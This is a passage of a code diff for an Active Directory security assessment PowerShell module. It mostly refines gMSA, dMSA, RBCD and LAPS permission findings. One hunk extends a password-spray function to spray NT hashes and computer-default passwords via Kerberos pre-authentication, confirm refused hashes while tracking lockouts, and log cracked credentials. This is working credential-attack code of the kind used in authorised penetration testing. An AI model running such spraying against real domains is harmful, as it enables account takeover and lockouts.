-                Write-Host "[*] Testing password: $pass" -ForegroundColor Cyan
+        foreach ($secret in $secrets) {
+            if (@($usernames | Where-Object { -not $finishedAccounts.ContainsKey($_) }).Count -eq 0) { break }
+            if ($secrets.Count -gt 1) {
+                Write-Host "[*] Testing ${secretLabel}: $secret" -ForegroundColor Cyan
             }
             $attemptNum = 0
             foreach ($username in $usernames) {
+                if ($finishedAccounts.ContainsKey($username)) { continue }
                 $attemptNum++
                 $totalAttempts++
                 $cleanUsername = $username
-                if ($username -match '\\') {
-                    $cleanUsername = $username.Split('\')[1]
-                } elseif ($username -match '@') {
-                    $cleanUsername = $username.Split('@')[0]
-                }
+                if ($ComputerDefault) { $secret = Get-ComputerDefaultPassword -SamAccountName $username }
                 if ($attemptNum % 50 -eq 0) {
                     $percent = [math]::Round(($attemptNum / $usernames.Count) * 100)
                     Write-Host "    Progress: $attemptNum/$($usernames.Count) ($percent%)" -ForegroundColor Gray
@@ -70735,31 +71476,75 @@ function Invoke-PasswordSpray {
                 $kerberosParams = @{
                     UserName = $cleanUsername
                     Domain = $targetDomain
-                    Password = $pass
                     ErrorAction = 'SilentlyContinue'
                 }
+                $kerberosParams[$secretKind] = $secret
                 if ($Server) { $kerberosParams['DomainController'] = $Server }
                 $result = Invoke-KerberosAuth @kerberosParams
-                if ($result.Success) {
-                    $successCount++
-                    $credInfo = [PSCustomObject]@{
-                        Username  = $cleanUsername
-                        Password  = $pass
-                        Domain    = $targetDomain
-                        Timestamp = (Format-adPEASDate (Get-Date) 'yyyy-MM-dd HH:mm:ss')
-                        Method    = "Kerberos Pre-Auth"
+                $hashValidRC4Refused = $false
+                if ($secretKind -eq 'NTHash' -and $result.ErrorCode -eq 14) {
+                    $confirmSafe = $true
+                    if ($lockoutThreshold -gt 0) {
+                        $badSoFar = [int]$runFailures[$username]
+                        if ($initialBadPwdCount.ContainsKey($username)) { $badSoFar += [int]$initialBadPwdCount[$username] }
+                        if (($lockoutThreshold - $badSoFar) -le 1) { $confirmSafe = $false }
+                    }
+                    if ($confirmSafe) {
+                        $confirmParams = $kerberosParams.Clone()
+                        $confirmParams['NTHash'] = New-UnrelatedNTHash
+                        $confirmation = Invoke-KerberosAuth @confirmParams
+                        if ($confirmation.ErrorCode -eq 24) {
+                            $runFailures[$username] = [int]$runFailures[$username] + 1
+                            $hashValidRC4Refused = $true
+                        } else {
+                            Write-Verbose "[-] ${cleanUsername}@${targetDomain}: a wrong hash got the same answer ($($confirmation.Error)) - the KDC refuses RC4 whatever the key"
+                        }
+                    } else {
+                        Write-Verbose "[-] ${cleanUsername}@${targetDomain}: KDC refused RC4 - not confirmed, a wrong hash would leave the account one attempt from lockout"
+                    }
+                }
+                if ($result.Success -or $hashValidRC4Refused) {
+                    if ($result.Success) { $successCount++ } else { $rc4RefusedValidCount++ }
+                    $finishedAccounts[$username] = $true
+                    $timestamp = Format-adPEASDate (Get-Date) 'yyyy-MM-dd HH:mm:ss'
+                    $credInfo = if ($secretKind -eq 'NTHash') {
+                        [PSCustomObject]@{
+                            Username   = $cleanUsername
+                            NTHash     = $secret
+                            Domain     = $targetDomain
+                            Timestamp  = $timestamp
+                            Method     = $(if ($hashValidRC4Refused) { "Kerberos Pre-Auth (NT-Hash, RC4-HMAC) - hash valid, KDC refused RC4" } else { "Kerberos Pre-Auth (NT-Hash, RC4-HMAC)" })
+                            RC4Refused = $hashValidRC4Refused
+                        }
+                    } else {
+                        [PSCustomObject]@{
+                            Username  = $cleanUsername
+                            Password  = $secret
+                            Domain    = $targetDomain
+                            Timestamp = $timestamp
+                            Method    = $(if ($ComputerDefault) { "Kerberos Pre-Auth (computer default password)" } else { "Kerberos Pre-Auth" })
+                        }
                     }
                     $successfulCreds += $credInfo
-                    Write-Host "[+] SUCCESS: ${cleanUsername}@${targetDomain}:${pass}" -ForegroundColor Green
+                    if ($hashValidRC4Refused) {
+                        Write-Host "[+] VALID HASH (KDC refused RC4): ${cleanUsername}@${targetDomain}:${secret}" -ForegroundColor Yellow
+                    } else {
+                        Write-Host "[+] SUCCESS: ${cleanUsername}@${targetDomain}:${secret}" -ForegroundColor Green
+                    }
                     if ($OutputFile) {
-                        "${cleanUsername}:${pass}" | Out-File -FilePath $OutputFile -Append -Encoding ASCII
+                        "${cleanUsername}:${secret}" | Out-File -FilePath $OutputFile -Append -Encoding ASCII
                     }
                     if ($StopOnSuccess) {
                         Write-Host "[*] Stopping on first success (StopOnSuccess flag set)" -ForegroundColor Yellow
                         break
                     }
+                } elseif ($result.ErrorCode -eq 14) {
+                    $notTestedCount++
+                    $finishedAccounts[$username] = $true
+                    Write-Verbose "[-] NOT TESTED: ${cleanUsername}@${targetDomain}:${secret} - $($result.Error)"
                 } else {
-                    Write-Verbose "[!] FAILED: ${cleanUsername}@${Domain}:${pass} - $($result.Error)"
+                    if ($result.ErrorCode -eq 24) { $runFailures[$username] = [int]$runFailures[$username] + 1 }
+                    Write-Verbose "[!] FAILED: ${cleanUsername}@${targetDomain}:${secret} - $($result.Error)"
                 }
                 if ($Delay -gt 0 -and $attemptNum -lt $usernames.Count) {
                     $actualDelay = $Delay
@@ -70770,7 +71555,7 @@ function Invoke-PasswordSpray {
                     Start-Sleep -Milliseconds $actualDelay
                 }
             }
-            if ($StopOnSuccess -and $successCount -gt 0) {
+            if ($StopOnSuccess -and ($successCount + $rc4RefusedValidCount) -gt 0) {
                 break
             }
         }
@@ -70785,10 +71570,21 @@ function Invoke-PasswordSpray {
         Write-Host "============================================================" -ForegroundColor Cyan
         Write-Host "  Total Attempts:    $totalAttempts"
         Write-Host "  Successful:        $successCount" -ForegroundColor $(if ($successCount -gt 0) { "Green" } else { "Gray" })
-        Write-Host "  Failed:            $($totalAttempts - $successCount)"
+        if ($rc4RefusedValidCount -gt 0) {
+            Write-Host "  Valid hash:        $rc4RefusedValidCount (KDC refused RC4 - no ticket, NTLM may accept it)" -ForegroundColor Yellow
+        }
+        Write-Host "  Failed:            $($totalAttempts - $successCount - $rc4RefusedValidCount - $notTestedCount)"
+        if ($notTestedCount -gt 0) {
+            $notTestedReason = if ($secretKind -eq 'NTHash') { 'KDC refused RC4, not confirmable' } else { 'KDC refused AES256' }
+            $refusedEType = if ($secretKind -eq 'NTHash') { 'RC4' } else { 'AES256' }
+            Write-Host "  Not tested:        $notTestedCount ($notTestedReason)" -ForegroundColor Yellow
+            if ($notTestedCount -eq $totalAttempts) {
+                Write-Host "  Result:            no $secretLabel could be tested - the KDC refused $refusedEType for every attempt" -ForegroundColor Red
+            }
+        }
         Write-Host "  Duration:          $([math]::Round($duration, 2)) seconds"
         Write-Host "  Rate:              $([math]::Round($totalAttempts / $duration, 2)) attempts/sec"
-        if ($OutputFile -and $successCount -gt 0) {
+        if ($OutputFile -and ($successCount + $rc4RefusedValidCount) -gt 0) {
             Write-Host "  Output File:       $OutputFile" -ForegroundColor Green
         }
         Write-Host "============================================================" -ForegroundColor Cyan
@@ -78136,24 +78932,36 @@ function Get-ManagedServiceAccountSecurity {
                     }
                 }
                 if ($totalGMSAs -gt $Script:ProgressThreshold) { Show-Progress -Activity "Analyzing gMSA security" -Completed }
-                $readerKinds = Get-ManagedAccountReaderKind -SID @($allReaderSIDs.Keys) -ConnectionParams $connectionParams
+                $readerCarriers = @{}
+                $readerKinds = Get-ManagedAccountReaderKind -SID @($allReaderSIDs.Keys) -ConnectionParams $connectionParams -Carrier $readerCarriers
                 $readerVerdictsByGMSA = @{}
+                $readerLabelsByGMSA = @{}
+                $orphanedReaderGMSAs = @()
                 foreach ($gmsa in $gmsaAccounts) {
                     $gmsaName = $gmsa.sAMAccountName
                     if (-not $gmsaReaderSIDs.ContainsKey($gmsaName)) { continue }
-                    $passwordReaders = @(Get-ManagedAccountReader -SID $gmsaReaderSIDs[$gmsaName] -ReaderKind $readerKinds)
+                    $passwordReaders = @(Get-ManagedAccountReader -SID $gmsaReaderSIDs[$gmsaName] -ReaderKind $readerKinds -Carrier $readerCarriers)
                     $hasBroadGroupAccess = @($passwordReaders | Where-Object { $_.IsBroadGroup }).Count -gt 0
-                    $unexpectedReaders = @($passwordReaders | Where-Object { -not $_.IsExpected })
+                    $unexpectedReaders = @($passwordReaders | Where-Object { -not $_.IsExpected -and -not $_.IsOrphaned })
+                    $orphanedReaders = @($passwordReaders | Where-Object { $_.IsOrphaned })
                     $verdictMap = @{}
-                    foreach ($reader in $passwordReaders) { $verdictMap[[string]$reader.SID] = $reader.Verdict }
+                    $labelMap = @{}
+                    foreach ($reader in $passwordReaders) {
+                        $verdictMap[[string]$reader.SID] = $reader.Verdict
+                        if ($reader.Label) { $labelMap[[string]$reader.SID] = [string]$reader.Label }
+                    }
                     $readerVerdictsByGMSA[$gmsaName] = $verdictMap
+                    $readerLabelsByGMSA[$gmsaName] = $labelMap
                     if ($unexpectedReaders.Count -gt 0) {
                         $nonPrivilegedAccessFindings += [PSCustomObject]@{
                             gMSA = $gmsaName
                             DN = $gmsa.distinguishedName
-                            NonPrivilegedReaders = $unexpectedReaders
-                            AllReaders = $passwordReaders
                             HasBroadGroupAccess = $hasBroadGroupAccess
+                        }
+                    } elseif ($orphanedReaders.Count -gt 0) {
+                        $orphanedReaderGMSAs += [PSCustomObject]@{
+                            gMSA   = $gmsaName
+                            Hidden = (@($orphanedReaders | Where-Object { $_.Verdict -eq 'DeletedOrHidden' }).Count -gt 0)
                         }
                     }
                 }
@@ -78182,22 +78990,37 @@ function Get-ManagedServiceAccountSecurity {
                         $gmsaObj | Add-Member -NotePropertyName '_adPEASContext' -NotePropertyValue $contextText -Force
                         if ($readerVerdictsByGMSA.ContainsKey($finding.gMSA)) {
                             $gmsaObj | Add-Member -NotePropertyName '_gmsaReaderVerdicts' -NotePropertyValue $readerVerdictsByGMSA[$finding.gMSA] -Force
+                            $gmsaObj | Add-Member -NotePropertyName '_gmsaReaderLabels' -NotePropertyValue $readerLabelsByGMSA[$finding.gMSA] -Force
                         }
                         Show-Object $gmsaObj -Class Finding
-                        $readerList = ($finding.NonPrivilegedReaders | ForEach-Object {
-                            $prefix = if ($_.IsBroadGroup) { "[CRITICAL] " } else { "" }
-                            "$prefix$($_.Principal) ($($_.SID))"
-                        }) -join ", "
-                        Show-Line "Non-privileged password readers: $readerList" -Class Hint
                     }
-                } elseif ($analyzedGMSAs -eq 0) {
-                    Show-Line "gMSA password access could not be analyzed - no membership descriptor could be read" -Class Note
-                } else {
-                    $unanalyzedCount = $totalGMSAs - $analyzedGMSAs
-                    if ($unanalyzedCount -gt 0) {
-                        Show-Line "gMSA password access is restricted to privileged accounts and service hosts ($unanalyzedCount of $totalGMSAs not analyzed)" -Class Note
+                }
+                if (@($orphanedReaderGMSAs).Count -gt 0) {
+                    $orphanCount = @($orphanedReaderGMSAs).Count
+                    if (@($orphanedReaderGMSAs | Where-Object { $_.Hidden }).Count -gt 0) {
+                        Show-Line "$orphanCount gMSA(s) grant their password to principals this account cannot find - deleted, or not visible to it:" -Class Hint
                     } else {
-                        Show-Line "All gMSA password access is properly restricted to privileged accounts and service hosts" -Class Secure
+                        Show-Line "$orphanCount gMSA(s) still grant their password to principals that no longer exist:" -Class Hint
+                    }
+                    foreach ($orphaned in $orphanedReaderGMSAs) {
+                        $gmsaObj = $gmsaAccounts | Where-Object { $_.sAMAccountName -eq $orphaned.gMSA }
+                        $gmsaObj | Add-Member -NotePropertyName '_adPEASObjectType' -NotePropertyValue 'gMSA' -Force
+                        $gmsaObj | Add-Member -NotePropertyName '_adPEASContext' -NotePropertyValue 'Stale password readers' -Force
+                        $gmsaObj | Add-Member -NotePropertyName '_gmsaReaderVerdicts' -NotePropertyValue $readerVerdictsByGMSA[$orphaned.gMSA] -Force
+                        $gmsaObj | Add-Member -NotePropertyName '_gmsaReaderLabels' -NotePropertyValue $readerLabelsByGMSA[$orphaned.gMSA] -Force
+                        Show-Object $gmsaObj -Class Hint
+                    }
+                }
+                if (@($nonPrivilegedAccessFindings).Count -eq 0 -and @($orphanedReaderGMSAs).Count -eq 0) {
+                    if ($analyzedGMSAs -eq 0) {
+                        Show-Line "gMSA password access could not be analyzed - no membership descriptor could be read" -Class Note
+                    } else {
+                        $unanalyzedCount = $totalGMSAs - $analyzedGMSAs
+                        if ($unanalyzedCount -gt 0) {
+                            Show-Line "gMSA password access is restricted to privileged accounts and service hosts ($unanalyzedCount of $totalGMSAs not analyzed)" -Class Note
+                        } else {
+                            Show-Line "All gMSA password access is properly restricted to privileged accounts and service hosts" -Class Secure
+                        }
                     }
                 }
                 if (@($undelegatedGMSAs).Count -gt 0) {
@@ -78230,7 +79053,7 @@ function Get-ManagedServiceAccountSecurity {
                         if ([long]::TryParse([string]$expiresRaw, [ref]$expiresValue) -and
                             $expiresValue -gt 0 -and $expiresValue -ne 9223372036854775807) {
                             $expiryText = 'unreadable'
-                            try { $expiryText = Format-adPEASDate ([DateTime]::FromFileTimeUtc($expiresValue)) 'yyyy-MM-dd' } catch {
+                            try { $expiryText = Format-adPEASDate ([DateTime]::FromFileTime($expiresValue)) 'yyyy-MM-dd' } catch {
                                 Write-Log "[Get-ManagedServiceAccountSecurity] Could not read accountExpires of $($gmsa.sAMAccountName): $_"
                             }
                         }
@@ -78330,9 +79153,11 @@ function Get-ManagedServiceAccountSecurity {
                     Show-Line "Retrieved $passwordsRetrieved of $($gmsaAccounts.Count) gMSA password(s)" -Class Finding
                 }
                 $ownerFindingNames = @($descriptorOwnerFindings | ForEach-Object { $_.gMSA })
+                $orphanedReaderNames = @($orphanedReaderGMSAs | ForEach-Object { $_.gMSA })
                 $gmsasWithoutFindings = @($gmsaAccounts | Where-Object {
                     $_.sAMAccountName -notin ($nonPrivilegedAccessFindings | ForEach-Object { $_.gMSA }) -and
-                    $_.sAMAccountName -notin $ownerFindingNames
+                    $_.sAMAccountName -notin $ownerFindingNames -and
+                    $_.sAMAccountName -notin $orphanedReaderNames
                 })
                 if ($gmsasWithoutFindings.Count -gt 0) {
                     Show-SubHeader "gMSA accounts with proper password access configuration:" -ObjectType "gMSAPassword"
@@ -78340,6 +79165,7 @@ function Get-ManagedServiceAccountSecurity {
                         $gmsa | Add-Member -NotePropertyName '_adPEASObjectType' -NotePropertyValue 'gMSA' -Force
                         if ($readerVerdictsByGMSA.ContainsKey([string]$gmsa.sAMAccountName)) {
                             $gmsa | Add-Member -NotePropertyName '_gmsaReaderVerdicts' -NotePropertyValue $readerVerdictsByGMSA[[string]$gmsa.sAMAccountName] -Force
+                            $gmsa | Add-Member -NotePropertyName '_gmsaReaderLabels' -NotePropertyValue $readerLabelsByGMSA[[string]$gmsa.sAMAccountName] -Force
                         }
                         Show-Object $gmsa -Class Secure
                     }
@@ -78502,21 +79328,33 @@ function Get-ManagedServiceAccountSecurity {
                             Write-Log "[Get-ManagedServiceAccountSecurity] Failed to parse msDS-GroupMSAMembership for $dmsaName : $_"
                         }
                     }
-                    $dmsaUserKinds = Get-ManagedAccountReaderKind -SID @($allDMSAUserSIDs.Keys) -ConnectionParams $connectionParams
+                    $dmsaCarriers = @{}
+                    $dmsaUserKinds = Get-ManagedAccountReaderKind -SID @($allDMSAUserSIDs.Keys) -ConnectionParams $connectionParams -Carrier $dmsaCarriers
                     $usableByOthers = @()
+                    $orphanedUserDMSAs = @()
                     foreach ($dmsa in $dmsaAccounts) {
                         $dmsaName = [string]$dmsa.sAMAccountName
                         if (-not $dmsaUserSIDs.ContainsKey($dmsaName)) { continue }
-                        $dmsaUsers = @(Get-ManagedAccountReader -SID $dmsaUserSIDs[$dmsaName] -ReaderKind $dmsaUserKinds)
+                        $dmsaUsers = @(Get-ManagedAccountReader -SID $dmsaUserSIDs[$dmsaName] -ReaderKind $dmsaUserKinds -Carrier $dmsaCarriers)
                         $verdictMap = @{}
-                        foreach ($dmsaUser in $dmsaUsers) { $verdictMap[[string]$dmsaUser.SID] = $dmsaUser.Verdict }
+                        $labelMap = @{}
+                        foreach ($dmsaUser in $dmsaUsers) {
+                            $verdictMap[[string]$dmsaUser.SID] = $dmsaUser.Verdict
+                            if ($dmsaUser.Label) { $labelMap[[string]$dmsaUser.SID] = [string]$dmsaUser.Label }
+                        }
                         $dmsa | Add-Member -NotePropertyName '_gmsaReaderVerdicts' -NotePropertyValue $verdictMap -Force
-                        $unexpectedUsers = @($dmsaUsers | Where-Object { -not $_.IsExpected })
+                        $dmsa | Add-Member -NotePropertyName '_gmsaReaderLabels' -NotePropertyValue $labelMap -Force
+                        $unexpectedUsers = @($dmsaUsers | Where-Object { -not $_.IsExpected -and -not $_.IsOrphaned })
+                        $orphanedUsers = @($dmsaUsers | Where-Object { $_.IsOrphaned })
                         if ($unexpectedUsers.Count -gt 0) {
                             $usableByOthers += [PSCustomObject]@{
-                                Account    = $dmsa
-                                Unexpected = $unexpectedUsers
-                                HasBroad   = (@($unexpectedUsers | Where-Object { $_.IsBroadGroup }).Count -gt 0)
+                                Account  = $dmsa
+                                HasBroad = (@($unexpectedUsers | Where-Object { $_.IsBroadGroup }).Count -gt 0)
+                            }
+                        } elseif ($orphanedUsers.Count -gt 0) {
+                            $orphanedUserDMSAs += [PSCustomObject]@{
+                                Account = $dmsa
+                                Hidden  = (@($orphanedUsers | Where-Object { $_.Verdict -eq 'DeletedOrHidden' }).Count -gt 0)
                             }
                         }
                     }
@@ -78531,12 +79369,19 @@ function Get-ManagedServiceAccountSecurity {
                             $entry.Account | Add-Member -NotePropertyName '_adPEASObjectType' -NotePropertyValue 'dMSA' -Force
                             $entry.Account | Add-Member -NotePropertyName '_adPEASContext' -NotePropertyValue $contextText -Force
                             Show-Object $entry.Account -Class Finding
-                            $userList = @($entry.Unexpected | ForEach-Object {
-                                $prefix = ''
-                                if ($_.IsBroadGroup) { $prefix = '[CRITICAL] ' }
-                                "$prefix$($_.Principal) ($($_.SID))"
-                            }) -join ', '
-                            Show-Line "Non-privileged principals allowed to use it: $userList" -Class Hint
+                        }
+                    }
+                    if (@($orphanedUserDMSAs).Count -gt 0) {
+                        $orphanCount = @($orphanedUserDMSAs).Count
+                        if (@($orphanedUserDMSAs | Where-Object { $_.Hidden }).Count -gt 0) {
+                            Show-Line "$orphanCount dMSA(s) name principals this account cannot find - deleted, or not visible to it:" -Class Hint
+                        } else {
+                            Show-Line "$orphanCount dMSA(s) still name principals that no longer exist:" -Class Hint
+                        }
+                        foreach ($entry in $orphanedUserDMSAs) {
+                            $entry.Account | Add-Member -NotePropertyName '_adPEASObjectType' -NotePropertyValue 'dMSA' -Force
+                            $entry.Account | Add-Member -NotePropertyName '_adPEASContext' -NotePropertyValue 'Stale principals' -Force
+                            Show-Object $entry.Account -Class Hint
                         }
                     }
                     $ownedDMSAs = @()
@@ -78557,7 +79402,7 @@ function Get-ManagedServiceAccountSecurity {
                     if (@($unparsedDMSAs).Count -gt 0) {
                         Show-Line "msDS-GroupMSAMembership could not be parsed on $(@($unparsedDMSAs).Count) dMSA(s) - who may use them is unknown: $(@($unparsedDMSAs) -join ', ')" -Class Note
                     }
-                    if (@($usableByOthers).Count -eq 0 -and @($ownedDMSAs).Count -eq 0 -and $dmsaUserSIDs.Count -gt 0) {
+                    if (@($usableByOthers).Count -eq 0 -and @($ownedDMSAs).Count -eq 0 -and @($orphanedUserDMSAs).Count -eq 0 -and $dmsaUserSIDs.Count -gt 0) {
                         $unanalyzedDMSAs = $dmsaAccounts.Count - $dmsaUserSIDs.Count
                         if ($unanalyzedDMSAs -gt 0) {
                             Show-Line "dMSA use is restricted to privileged accounts and service hosts ($unanalyzedDMSAs of $($dmsaAccounts.Count) not analyzed)" -Class Note
@@ -78677,7 +79522,9 @@ function Get-ManagedAccountReaderKind {
         [AllowEmptyCollection()]
         [string[]]$SID = @(),
         [Parameter(Mandatory = $false)]
-        [hashtable]$ConnectionParams = @{}
+        [hashtable]$ConnectionParams = @{},
+        [Parameter(Mandatory = $false)]
+        [hashtable]$Carrier
     )
     $hostClasses = @('computer', 'msDS-ManagedServiceAccount', 'msDS-GroupManagedServiceAccount')
     $readerKinds = @{}
@@ -78691,6 +79538,14 @@ function Get-ManagedAccountReaderKind {
             $readerObject = @(Get-DomainObject -Identity $readerSID -Properties 'objectClass', 'distinguishedName' @ConnectionParams)[0]
             if (-not $readerObject) {
                 $readerKind = 'Unresolved'
+                $sidState = Get-UnresolvedSIDState -SID $readerSID -ConnectionParams $ConnectionParams
+                if ($sidState.State -in @('Deleted', 'DeletedOrHidden')) {
+                    $readerKind = $sidState.State
+                } elseif ($sidState.State -eq 'SIDHistory' -and $sidState.CarrierSID) {
+                    $carrierKinds = Get-ManagedAccountReaderKind -SID @($sidState.CarrierSID) -ConnectionParams $ConnectionParams
+                    if ($carrierKinds.ContainsKey($sidState.CarrierSID)) { $readerKind = $carrierKinds[$sidState.CarrierSID] }
+                    if ($null -ne $Carrier) { $Carrier[$readerSID] = @{ SID = $sidState.CarrierSID; Name = $sidState.Carrier } }
+                }
             } elseif (@(@($readerObject.objectClass) | Where-Object { $hostClasses -icontains $_ }).Count -gt 0) {
                 $readerKind = 'Host'
             } elseif (@($readerObject.objectClass) -icontains 'group') {
@@ -78718,21 +79573,36 @@ function Get-ManagedAccountReader {
         [AllowEmptyCollection()]
         [string[]]$SID = @(),
         [Parameter(Mandatory = $false)]
-        [hashtable]$ReaderKind = @{}
+        [hashtable]$ReaderKind = @{},
+        [Parameter(Mandatory = $false)]
+        [hashtable]$Carrier = @{}
     )
     foreach ($readerSID in @($SID | Where-Object { $_ })) {
         $principalName = ConvertFrom-SID -SID $readerSID
         if (-not $principalName) { $principalName = $readerSID }
-        $category = (Test-IsPrivileged -Identity $readerSID).Category
+        $judgedSID = $readerSID
+        $label = $null
+        if ($Carrier.ContainsKey($readerSID)) {
+            $judgedSID = [string]$Carrier[$readerSID].SID
+            $principalName = "$($Carrier[$readerSID].Name) (sIDHistory: $readerSID)"
+            $label = $principalName
+        }
+        $category = (Test-IsPrivileged -Identity $judgedSID).Category
         $kind = 'Unresolved'
         if ($ReaderKind.ContainsKey($readerSID)) { $kind = $ReaderKind[$readerSID] }
+        $isOrphaned = $kind -in @('Deleted', 'DeletedOrHidden')
         $isBroadGroup = $category -eq 'BroadGroup'
         $isExpected = $false
-        if (-not $isBroadGroup) {
+        if (-not $isBroadGroup -and -not $isOrphaned) {
             $isExpected = ($category -in @('Privileged', 'Operator')) -or ($kind -eq 'Host')
         }
         $verdict = 'Unexpected'
-        if ($isBroadGroup) { $verdict = 'Broad' } elseif ($isExpected) { $verdict = 'Expected' }
+        if ($isBroadGroup) { $verdict = 'Broad' }
+        elseif ($isOrphaned) {
+            $verdict = $kind
+            $label = if ($kind -eq 'Deleted') { "$readerSID (deleted)" } else { "$readerSID (deleted or not visible)" }
+        }
+        elseif ($isExpected) { $verdict = 'Expected' }
         [PSCustomObject]@{
             Principal    = $principalName
             SID          = $readerSID
@@ -78740,7 +79610,9 @@ function Get-ManagedAccountReader {
             Kind         = $kind
             IsExpected   = $isExpected
             IsBroadGroup = $isBroadGroup
+            IsOrphaned   = $isOrphaned
             Verdict      = $verdict
+            Label        = $label
         }
     }
 }
@@ -79600,6 +80472,10 @@ function Get-ResourceBasedConstrainedDelegation {
                 return
             }
             Show-SubHeader "Searching for accounts with RBCD configured..." -ObjectType "RBCDelegation"
+            $connectionParams = @{}
+            foreach ($connectionKey in @('Domain', 'Server', 'Credential')) {
+                if ($PSBoundParameters.ContainsKey($connectionKey)) { $connectionParams[$connectionKey] = $PSBoundParameters[$connectionKey] }
+            }
             $rbcdComputers = @(Get-DomainComputer -RBCD -Enabled -ShowOwner @PSBoundParameters)
             $rbcdUsers = @(Get-DomainUser -RBCD -Enabled -ShowOwner @PSBoundParameters)
             $rbcdMSAs = @(Get-DomainUser -GMSA -RBCD -Enabled -ShowOwner @PSBoundParameters)
@@ -79644,7 +80520,16 @@ function Get-ResourceBasedConstrainedDelegation {
                 if (-not $undecoded) { $principals = @($rawPrincipals | Where-Object { $_ }) }
                 $emptyDescriptor = ($principals.Count -eq 1 -and ([string]$principals[0]) -eq '[SD present, no Allow ACEs]')
                 $inertPattern = '^(.+) \[inert: generic rights only\]$'
-                $livePrincipals = @($principals | Where-Object { ([string]$_).Trim() -notmatch $inertPattern })
+                $sidStates = @{}
+                foreach ($principal in $principals) {
+                    $sidText = ([string]$principal).Trim()
+                    if ($sidText -match $inertPattern) { continue }
+                    if ($sidText -match '^S-1-') { $sidStates[$sidText] = Get-UnresolvedSIDState -SID $sidText -ConnectionParams $connectionParams }
+                }
+                $livePrincipals = @($principals | Where-Object {
+                    $liveText = ([string]$_).Trim()
+                    ($liveText -notmatch $inertPattern) -and -not ($sidStates.ContainsKey($liveText) -and $sidStates[$liveText].State -eq 'Deleted')
+                })
                 $delegatesNobody = $emptyDescriptor -or ($principals.Count -gt 0 -and $livePrincipals.Count -eq 0)
                 if ($targetIsDC -and -not $delegatesNobody) {
                     $account | Add-Member -NotePropertyName 'rbcdTarget' -NotePropertyValue (
@@ -79668,32 +80553,51 @@ function Get-ResourceBasedConstrainedDelegation {
                             $risks += "${inertName}: none - the entry carries generic rights only, which the KDC does not honour, so it delegates nothing"
                             continue
                         }
-                        if ($principalText -match '^S-1-') {
-                            $risks += "${principalText}: unresolved - a deleted or foreign principal that still holds the delegation"
-                            continue
+                        $label = $principalText
+                        $evalName = $principalText
+                        if ($sidStates.ContainsKey($principalText)) {
+                            $sidState = $sidStates[$principalText]
+                            if ($sidState.State -eq 'Deleted') {
+                                $risks += "${principalText}: deleted - no account holds this SID any more, so the entry delegates nothing"
+                                continue
+                            } elseif ($sidState.State -eq 'DeletedOrHidden') {
+                                $risks += "${principalText}: deleted, or not visible to this account - who holds it cannot be told from here"
+                                continue
+                            } elseif ($sidState.State -eq 'SIDHistory') {
+                                $label = "$principalText (in the sIDHistory of $($sidState.Carrier))"
+                                $evalName = $sidState.Carrier
+                            } elseif ($sidState.State -eq 'Present') {
+                                $evalName = $sidState.SID
+                            } elseif ($sidState.State -eq 'Foreign') {
+                                $risks += "${principalText}: unresolved - a principal of another domain that may still hold the delegation"
+                                continue
+                            } else {
+                                $risks += "${principalText}: unresolved - a principal that could not be identified and may still hold the delegation"
+                                continue
+                            }
                         }
                         $principalSID = $null
-                        try { $principalSID = ConvertTo-SID -Identity $principalText @PSBoundParameters } catch { }
+                        try { $principalSID = ConvertTo-SID -Identity $evalName @PSBoundParameters } catch { }
                         if ($principalSID -and (Test-IsBroadTrustee -SID ([string]$principalSID))) {
-                            $risks += "${principalText}: a broad group - every member of it can impersonate any account to this resource"
+                            $risks += "${label}: a broad group - every member of it can impersonate any account to this resource"
                             $rbcdClass = 'Finding'
                             continue
                         }
                         $verdict = $null
                         try {
-                            $verdict = Test-IsExpectedInScope -Identity $principalText -Scope 'KerberosDelegation' -ReturnDetails
+                            $verdict = Test-IsExpectedInScope -Identity $evalName -Scope 'KerberosDelegation' -ReturnDetails
                         } catch {
-                            Write-Log "[Get-ResourceBasedConstrainedDelegation] Scope check failed for '$principalText': $_"
+                            Write-Log "[Get-ResourceBasedConstrainedDelegation] Scope check failed for '$evalName': $_"
                         }
                         if ($verdict -and $verdict.Severity -eq 'Secure') {
-                            $risks += "${principalText}: expected - $($verdict.Reason)"
+                            $risks += "${label}: expected - $($verdict.Reason)"
                         } elseif ($verdict -and $verdict.Severity -eq 'Finding') {
-                            $risks += "${principalText}: $($verdict.Reason)"
+                            $risks += "${label}: $($verdict.Reason)"
                             $rbcdClass = 'Finding'
                         } elseif ($verdict -and $verdict.Reason) {
-                            $risks += "${principalText}: $($verdict.Reason)"
+                            $risks += "${label}: $($verdict.Reason)"
                         } else {
-                            $risks += "${principalText}: not assessed - the principal could not be resolved"
+                            $risks += "${label}: not assessed - the principal could not be resolved"
                         }
                     }
                     if ($risks.Count -gt 0) {
@@ -81831,6 +82735,10 @@ function Get-LAPSPermissions {
                 Show-Line "No LAPS schema found" -Class Note
                 return
             }
+            $lapsGUIDsMissing = (-not $lapsSchema.AttributeGUIDs) -or (@($lapsSchema.AttributeGUIDs.Keys).Count -eq 0)
+            if ($lapsGUIDsMissing) {
+                Show-Line "LAPS attribute GUIDs not readable from the schema - delegated LAPS reads were not evaluated" -Class Note
+            }
             $allComputers = @(Get-DomainComputer -Enabled -Properties "distinguishedName","lastLogonTimestamp" @connectionParams)
             $activeDNs = @{}
             foreach ($active in @($allComputers | Test-AccountActivity -IsActive)) {
@@ -81966,7 +82874,7 @@ function Get-LAPSPermissions {
             $readScope = Format-OUContainerCount -DistinguishedName @(@($computersByOU.Keys) | Where-Object { $unreadOUs -notcontains $_ })
             $coverageIncomplete = Show-OUPermissionsCoverageNote -UnreadOUs $unreadOUs -TotalOUs $totalOUs
             $conclusionClass = 'Secure'
-            if ($coverageIncomplete) { $conclusionClass = 'Note' }
+            if ($coverageIncomplete -or $lapsGUIDsMissing) { $conclusionClass = 'Note' }
             function Get-LAPSRightLabel {
                 param($ReaderInfo)
                 if ($ReaderInfo.AllBlockedByConfidentialFlag -eq $true) {
@@ -82134,6 +83042,37 @@ function Get-LAPSPermissions {
                 Show-Line "LAPS read permissions were not evaluated - no security descriptor could be read" -Class Note
             } else {
                 Show-Line "No non-privileged accounts with LAPS read access found in the $readScope analyzed" -Class $conclusionClass
+            }
+            if ($windowsLAPSSchemaPresent) {
+                $decryptorParts = @()
+                $lapsGPOConfig = $null
+                try { $lapsGPOConfig = Get-LAPSGPOConfig } catch {
+                    Write-Log "[Get-LAPSPermissions] Windows LAPS policies could not be read: $_"
+                }
+                if ($lapsGPOConfig -and $lapsGPOConfig.Native) {
+                    foreach ($nativePolicy in @($lapsGPOConfig.Native.Values | Sort-Object { [string]$_['GPOName'] })) {
+                        $policyName = [string]$nativePolicy['GPOName']
